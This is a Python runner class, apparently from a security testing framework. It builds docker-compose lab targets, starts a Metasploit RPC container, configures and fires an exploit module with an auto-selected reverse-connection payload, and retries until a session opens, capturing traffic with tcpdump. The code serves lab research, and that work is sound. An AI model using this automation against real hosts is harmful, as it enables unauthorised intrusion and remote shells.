from __future__ import annotations

import logging
import os
import secrets
import time

import docker
import docker.models.containers
from python_on_whales import DockerClient
from python_on_whales.exceptions import DockerException
from rich.console import Console
from runners.base import BaseRunner
from utils import safe_stop_remove

logger = logging.getLogger(__name__)
console = Console(stderr=True)


class DockerComposeMsfRpc(BaseRunner):
    """Runner for exploiting multi-container targets via docker-compose using Metasploit RPC."""

    def __init__(self, docker_client: docker.DockerClient, vuln_name: str = "", target_name: str = "target",
                 network_name: str = "set_framework_net", volume_name: str = "set_logs",
                 target_yml: str = "", msf_exploit: str = "", msf_options: str = "", delay: int = 0,
                 msf_image: str = "metasploitframework/metasploit-framework:6.2.33",
                 prefix: str = "") -> None:
        """Initialize with compose file path, target service name, and exploit config."""
        super().__init__(docker_client, network_name, volume_name, prefix=prefix)
        self.vuln_name = vuln_name
        self.target_yml = self._expand_and_validate(target_yml, "yml_file")
        self.target_name = target_name
        self.msf_exploit = msf_exploit
        self.msf_options = msf_options
        self.delay = delay
        self.msf_image = msf_image
        self.compose_project = self.prefix if self.prefix else "setc"
        self.rpc_password = secrets.token_hex(8)
        self.rpc_port = 55552
        self.rpc_client = None

        self.setc_yml = self._expand_and_validate(
            "$SETC_PATH/example_configurations/setc-net_docker-compose.yml", "SETC_PATH")
        self.wdocker = None
        self.tcpdump_instances = []
        self.attack = None

    @staticmethod
    def _expand_and_validate(path: str, label: str) -> str:
        """Expand environment variables in a path and verify it exists.

        Raises:
            EnvironmentError: If any env vars remain unexpanded.
            FileNotFoundError: If the expanded path does not exist.
        """
        expanded = os.path.expandvars(path)
        if "$" in expanded:
            unset = [tok for tok in expanded.split(os.sep) if tok.startswith("$")]
            raise EnvironmentError(
                f"Environment variable(s) not set for {label}: {', '.join(unset)}. "
                f"Path after expansion: {expanded}"
            )
        if not os.path.exists(expanded):
            raise FileNotFoundError(
                f"Path does not exist for {label}: {expanded}"
            )
        return expanded

    def target_setup(self) -> None:
        """Build and start the docker-compose services."""
        wdocker = DockerClient(compose_project_name=self.compose_project, compose_files=[self.target_yml, self.setc_yml])
        wdocker.compose.build()
        wdocker.compose.up(detach=True)
        self.wdocker = wdocker
        if self.prefix:
            self.target_name = self.target_name.replace("setc-", f"{self.compose_project}-", 1)

    def target_cleanup(self) -> None:
        """Stop and remove all compose services and tcpdump sidecars."""
        if self.tcpdump_instances:
            self.tcpdump_cleanup()
        try:
            self.wdocker.compose.stop()
            self.wdocker.compose.rm()
        except DockerException as e:
            logger.warning("Failed to stop/remove compose services: %s", e)

    def tcpdump_setup(self) -> None:
        """Start a tcpdump container for the target compose service."""
        tcpdump_instances = []
        for i in self.wdocker.compose.ps():
            if i.name == self.target_name:
                dk_tcpdump = self._run_tcpdump_container(self.vuln_name, self.target_name)
                tcpdump_instances.append(dk_tcpdump)
        self.tcpdump_instances = tcpdump_instances

    def tcpdump_cleanup(self) -> None:
        """Stop and remove all tcpdump sidecar containers."""
        for instance in self.tcpdump_instances:
            safe_stop_remove(instance, label="tcpdump")

    def attack_setup(self) -> None:
        """Start the Metasploit attack container with msfrpcd and connect via RPC."""
        logger.debug("Starting RPC attack system for %s", self.target_name)
        cmd = ["./msfrpcd", "-P", self.rpc_password, "-S", "-f", "-a", "0.0.0.0",
               "-p", str(self.rpc_port)]
        dk_attack = self.client.containers.run(
            self.msf_image,
            command=cmd,
            detach=True,
            name="%s-attack" % self.target_name,
            network=self.network,
            tty=True,
        )
        self.attack = dk_attack
        self.rpc_client = self._wait_for_msfrpc(dk_attack, self.rpc_password, port=self.rpc_port)

    def attack_cleanup(self) -> None:
        """Stop and remove the Metasploit attack container."""
        self.rpc_client = None
        safe_stop_remove(self.attack, label="%s-attack" % self.target_name)

    @staticmethod
    def _set_module_option(module, key, value):
        """Set an option on a module, falling back to _runopts for payload options.

        The RPC module's __setitem__ raises KeyError for options not defined on
        the exploit module (e.g. LHOST, LPORT which are payload options).  These
        still need to land in _runopts so that execute() forwards them in the
        RPC call.
        """
        if key in module.options:
            module[key] = value
        else:
            module._runopts[key] = value

    def exploit(self) -> None:
        """Execute the configured exploit via the Metasploit RPC API."""
        module = self.rpc_client.modules.use('exploit', self.msf_exploit)

        # Core options — use helper to handle exploit vs payload options
        self._set_module_option(module, 'RHOSTS', self.target_name)
        self._set_module_option(module, 'LHOST', "%s-attack" % self.target_name)
        self._set_module_option(module, 'ForceExploit', True)
        self._set_module_option(module, 'AutoCheck', False)

        # Parse and apply user-provided options
        parsed = self._parse_msf_options(self.msf_options)
        payload = parsed.pop('PAYLOAD', None)
        for key, value in parsed.items():
            self._set_module_option(module, key, value)

        # A payload MUST be provided to execute(), otherwise pymetasploit3
        # sets DisablePayloadHandler=True and no handler listens for the
        # reverse connection.  Auto-select the first compatible payload
        # when the user hasn't specified one (mirrors msfconsole behaviour).
        if payload is None:
            compatible = module.payloads
            if compatible:
                payload = compatible[0]

        self._last_payload = payload
        result = module.execute(payload=payload)
        self._last_job_id = result.get('job_id')

    def exploit_success(self, pattern: str = "4444") -> bool:
        """Check if the exploit established a session via RPC session list."""
        try:
            sessions = self.rpc_client.sessions.list
            return bool(sessions)
        except Exception:
            return False

    def exploit_until_success(self, status_delay: int = 3, status_checks: int = 7, tries: int = 4) -> bool:
        """Repeatedly run the exploit until an RPC session is established."""
        success = False
        with console.status(f"[bold]Exploiting {self.target_name} (RPC)...[/bold]"):
            for i in range(tries):
                self.exploit()
                for j in range(status_checks):
                    if self.exploit_success(pattern=self.exploit_success_pattern):
                        success = True
                        break
                    time.sleep(status_delay)
                if success:
                    break
        if success:
            logger.info("Exploit of %s success (RPC session established)", self.target_name)
        else:
            logger.warning("Exploit failed or status unknown (RPC)")
        return success

    def _get_target_container(self) -> docker.models.containers.Container:
        """Look up and return the target container by name from the Docker API."""
        return self.client.containers.get(self.target_name)
